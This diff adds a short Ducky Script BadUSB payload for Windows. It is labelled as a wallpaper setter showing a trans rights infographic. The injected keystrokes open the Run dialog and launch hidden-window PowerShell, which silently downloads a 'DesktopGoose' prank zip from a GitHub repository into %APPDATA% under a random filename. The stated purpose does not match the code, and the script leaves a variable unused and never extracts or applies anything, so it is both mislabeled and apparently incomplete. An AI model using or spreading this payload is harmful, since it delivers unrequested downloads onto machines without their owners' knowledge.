@@ -1,0 +1,15 @@
+REM Title: Trans Rights Background Setter
+REM Author: DaniTheCyberpunkGirl
+REM Target:  Windows 10+
+REM Version: 1.0
+REM Downloads trans rights infographic and sets it as the background
+REM
+REM startup delay
+DELAY 300
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+STRING powershell -w h ($Z="$env:APPDATA"+'\mnwmimmekowfjw.zip');$D="$env:APPDATA"+'\dewrecg';curl https://github.com/danithecyberpunkgirl/flipper-playground/raw/main/USBRubberDucky/Windows/Pranks/DesktopGoose/dg-01.zip -O $Z;exit
+ENTER
